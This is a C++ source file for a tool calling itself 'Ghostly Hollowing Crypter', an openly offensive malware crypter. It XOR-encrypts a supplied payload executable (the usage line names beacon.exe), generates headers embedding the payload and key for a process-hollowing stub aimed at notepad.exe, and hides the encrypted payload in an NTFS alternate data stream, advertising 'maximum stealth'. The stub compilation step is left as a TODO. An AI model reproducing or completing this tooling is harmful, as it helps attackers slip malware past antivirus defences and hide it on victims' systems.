#define NOMINMAX
#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <iomanip>
#include <random>
#include <sstream>

// ============ CONFIGURATION ============
#define ADS_STREAM_NAME "ghost.data"
#define KEY_SIZE 16 // AES-128 / XMM register size

// ============ UTILS ============
std::string RandomString(size_t length)
{
    static const char charset[] =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);

    std::string result;
    for (size_t i = 0; i < length; i++)
        result += charset[dis(gen)];
    return result;
}

// ============ XOR ENCRYPTION ============
void XorEncrypt(std::vector<BYTE> &data, const std::string &key)
{
    for (size_t i = 0; i < data.size(); i++)
        data[i] ^= key[i % key.length()];
}

// ============ SSE KEY HEADER GENERATOR ============
std::string GenerateSSEKeyHeader(const std::string &key)
{
    std::stringstream ss;

    ss << "// ============ SSE XMM KEY (GENERATED) ============\n";
    ss << "#pragma section(\".text\", execute, read, write)\n";
    ss << "__declspec(allocate(\".text\")) __m128i g_XmmKey = _mm_setr_epi8(\n    ";

    // Pad key to 16 bytes
    std::string paddedKey = key;
    paddedKey.resize(KEY_SIZE, 0x00);

    for (int i = 0; i < KEY_SIZE; i++)
    {
        ss << "0x" << std::hex << std::setw(2) << std::setfill('0')
           << (int)(unsigned char)paddedKey[i];
        if (i < KEY_SIZE - 1)
            ss << ", ";
        if (i % 8 == 7 && i < KEY_SIZE - 1)
            ss << "\n    ";
    }

    ss << "\n);\n\n";
    ss << "VOID SetXorKeyFromSSE()\n";
    ss << "{\n";
    ss << "    // Key already loaded in XMM register via g_XmmKey\n";
    ss << "    __m128i xmmKey = g_XmmKey;\n";
    ss << "    volatile __m128i* pKey = &xmmKey;\n";
    ss << "    (void)pKey; // Prevent optimization\n";
    ss << "}\n\n";

    return ss.str();
}

// ============ PAYLOAD STUB GENERATOR ============
bool GenerateStubWithPayload(
    const std::string &stubTemplatePath,
    const std::string &outputStubPath,
    const std::vector<BYTE> &encryptedPayload,
    const std::string &xorKey,
    const std::string &targetProcess)
{
    // Read stub template
    std::ifstream stubFile(stubTemplatePath, std::ios::binary);
    if (!stubFile)
    {
        std::cerr << "[-] Failed to read stub template\n";
        return false;
    }

    std::vector<BYTE> stubData(
        (std::istreambuf_iterator<char>(stubFile)),
        std::istreambuf_iterator<char>());
    stubFile.close();

    // Generate C++ header with embedded payload
    std::stringstream payloadHeader;
    payloadHeader << "// ============ ENCRYPTED PAYLOAD (GENERATED) ============\n";
    payloadHeader << "#pragma once\n";
    payloadHeader << "#include <vector>\n\n";

    payloadHeader << "const unsigned char g_EncryptedPayload[] = {\n    ";

    for (size_t i = 0; i < encryptedPayload.size(); i++)
    {
        payloadHeader << "0x" << std::hex << std::setw(2) << std::setfill('0')
                      << (int)encryptedPayload[i];
        if (i < encryptedPayload.size() - 1)
            payloadHeader << ", ";
        if ((i + 1) % 16 == 0)
            payloadHeader << "\n    ";
    }

    payloadHeader << "\n};\n\n";
    payloadHeader << "const SIZE_T g_PayloadSize = "
                  << std::dec << encryptedPayload.size() << ";\n\n";

    payloadHeader << "const char* g_TargetProcess = \""
                  << targetProcess << "\";\n\n";

    // Generate SSE key header
    std::string sseHeader = GenerateSSEKeyHeader(xorKey);

    // TODO: In a real implementation, you would:
    // 1. Replace placeholders in stub template
    // 2. Compile the stub with embedded payload
    // 3. This is a simplified version - actual stub compilation
    //    requires invoking g++ programmatically

    std::cout << "[+] Generated payload header (" << encryptedPayload.size() << " bytes)\n";
    std::cout << "[+] Generated SSE key header\n";
    std::cout << "[+] XOR Key: " << xorKey << "\n";

    // For demo, we'll just write the encrypted payload to ADS of the output stub
    std::string adsPath = outputStubPath + ":" + ADS_STREAM_NAME;
    HANDLE hFile = CreateFileA(
        adsPath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] Failed to create ADS: " << GetLastError() << "\n";
        return false;
    }

    DWORD bytesWritten;
    WriteFile(hFile, encryptedPayload.data(), encryptedPayload.size(),
              &bytesWritten, NULL);
    CloseHandle(hFile);

    std::cout << "[+] Payload written to: " << adsPath << "\n";

    return true;
}

// ============ MAIN ============
int main(int argc, char *argv[])
{
    std::cout << "========================================\n";
    std::cout << "   Ghostly Hollowing Crypter v1.0\n";
    std::cout << "   MAXIMUM STEALTH - SSE + ADS + Syscall\n";
    std::cout << "========================================\n\n";

    if (argc < 3)
    {
        std::cout << "Usage: " << argv[0] << " <payload.exe> <stub_template.exe> [target.exe]\n";
        std::cout << "Example: " << argv[0] << " beacon.exe stub_template.exe C:\\Windows\\System32\\notepad.exe\n";
        return 1;
    }

    std::string payloadPath = argv[1];
    std::string stubPath = argv[2];
    std::string targetProcess = (argc >= 4) ? argv[3] : "C:\\Windows\\System32\\notepad.exe";

    // Generate random XOR key (16 bytes for XMM register)
    std::string xorKey = RandomString(16);

    // Read payload
    std::ifstream payloadFile(payloadPath, std::ios::binary);
    if (!payloadFile)
    {
        std::cerr << "[-] Failed to open payload\n";
        return 1;
    }

    std::vector<BYTE> payloadData(
        (std::istreambuf_iterator<char>(payloadFile)),
        std::istreambuf_iterator<char>());
    payloadFile.close();

    std::cout << "[+] Payload loaded: " << payloadData.size() << " bytes\n";
    std::cout << "[+] Target process: " << targetProcess << "\n\n";

    // Encrypt payload
    std::vector<BYTE> encryptedPayload = payloadData;
    XorEncrypt(encryptedPayload, xorKey);
    std::cout << "[+] Payload encrypted with XOR\n";

    // Generate stub with embedded payload
    std::string outputStub = "ghostly_" + payloadPath.substr(payloadPath.find_last_of("/\\") + 1);

    if (GenerateStubWithPayload(stubPath, outputStub, encryptedPayload, xorKey, targetProcess))
    {
        std::cout << "\n[+] SUCCESS! Generated stub: " << outputStub << "\n";
        std::cout << "[+] XOR Key: " << xorKey << "\n";
        std::cout << "[+] ADS Stream: " << outputStub << ":" << ADS_STREAM_NAME << "\n";
        std::cout << "\n[!] IMPORTANT: Save this key - required for decryption!\n";
    }
    else
    {
        std::cerr << "[-] Failed to generate stub\n";
        return 1;
    }

    return 0;
}

/// x86_64-w64-mingw32-g++ -o crypter_ghostly.exe crypter_ghostly.cpp -static